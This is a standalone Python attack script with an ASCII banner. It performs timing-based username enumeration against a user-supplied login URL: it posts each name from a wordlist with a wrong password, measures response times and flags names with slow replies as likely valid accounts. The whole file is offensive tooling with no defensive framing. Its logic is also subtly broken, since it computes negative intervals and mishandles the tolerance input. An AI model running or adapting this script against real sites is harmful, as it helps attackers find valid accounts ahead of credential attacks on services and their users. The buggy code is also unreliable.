import requests
import time
import json
from tqdm import tqdm
import sys

art="""
                                                                                                                                       _.--,-```-.    
                                                 ,--.                                                                                 /    /      '.  
             .---.   ,---,                   ,--/  /|             ,--,      ,--,                               ,---,         ,---,.  /  ../         ; 
            /. ./| ,--.' |                ,---,': / '   ,--,    ,--.'|    ,--.'|                     ,---,   .'  .' `\     ,'  .'  \ \  ``\  .``-    '
        .--'.  ' ; |  |  :        ,---.   :   : '/ /  ,--.'|    |  | :    |  | :                   ,---.'| ,---.'     \  ,---.' .' |  \ ___\/    \   :
       /__./ \ : | :  :  :       '   ,'\  |   '   ,   |  |,     :  : '    :  : '                   |   | : |   |  .`\  | |   |  |: |        \    :   |
   .--'.  '   \' . :  |  |,--.  /   /   | '   |  /    `--'_     |  ' |    |  ' |       ,---.       |   | | :   : |  '  | :   :  :  /        |    ;  . 
  /___/ \ |    ' ' |  :  '   | .   ; ,. : |   ;  ;    ,' ,'|    '  | |    '  | |      /     \    ,--.__| | |   ' '  ;  : :   |    ;        ;   ;   :  
  ;   \  \;      : |  |   /' : '   | |: : :   '   \   '  | |    |  | :    |  | :     /    /  |  /   ,'   | '   | ;  .  | |   :     \      /   :   :   
   \   ;  `      | '  :  | | | '   | .; : |   |    '  |  | :    '  : |__  '  : |__  .    ' / | .   '  /  | |   | :  |  ' |   |   . |      `---'.  |   
    .   \    .\  ; |  |  ' | : |   :    | '   : |.  \ '  : |__  |  | '.'| |  | '.'| '   ;   /| '   ; |:  | '   : | /  ;  '   :  '; |       `--..`;    
     \   \   ' \ | |  :  :_:,'  \   \  /  |   | '_\.' |  | '.'| ;  :    ; ;  :    ; '   |  / | |   | '/  ' |   | '` ,/   |   |  | ;      .--,_        
      :   '  |--"  |  | ,'       `----'   '   : |     ;  :    ; |  ,   /  |  ,   /  |   :    | |   :    :| ;   :  .'     |   :   /       |    |`.     
       \   \ ;     `--''                  ;   |,'     |  ,   /   ---`-'    ---`-'    \   \  /   \   \  /   |   ,.'       |   | ,'        `-- -`, ;    
        '---"                             '---'        ---`-'                         `----'     `----'    '---'         `----'            '---`"     
                                                                                                                                                                                                                                                                                                                                                                                                                      
"""
print(art)












try : 
    URL=input("[+] Enter URL : ")
    USERNAME_FILE_NAME=input("[+] Enter Use Name List : ")
    usernames=[]
    USER_NAMES=open(USERNAME_FILE_NAME,"r")
    for line in USER_NAMES :
        usernames.append(line.replace("\n", ""))
except FileNotFoundError :
    print("[-] File Not Found !")
    sys.exit(-1)

intervals = dict()

def tryLogin(user): 
    creds = {"username": user, "password": "WrongPassword"}
    response = requests.post(URL, json=creds)
    if response.status_code != 200:
        print("[+] Error : ", response.status_code)


print("[+] Starting Attack")


try : 
    tryLogin("testuser")
except Exception as e :
    print(f"[-] Error Raised As : {e}")
    sys.exit(-1)

for user in tqdm(usernames,desc="[+] Sending POST requests " , unit=" Usernames"):
    start=time.time()
    tryLogin(user)
    stop=time.time()
    intervals[user]=start-stop
    time.sleep(0.01)

print("[+] Finished Attack")

tolerence = 0.9

largest=max(intervals.values())
smallest=min(intervals.values())
delta=largest-smallest

print(f"[+] Delta = {delta}")

while tolerence <= 1 and tolerence >0 :
    tolerence=input("[+] Enter Tolerence Value : ")

for user,time in intervals.items():
    if time >=delta*tolerence:
        print(f"[+] {user} : {time}")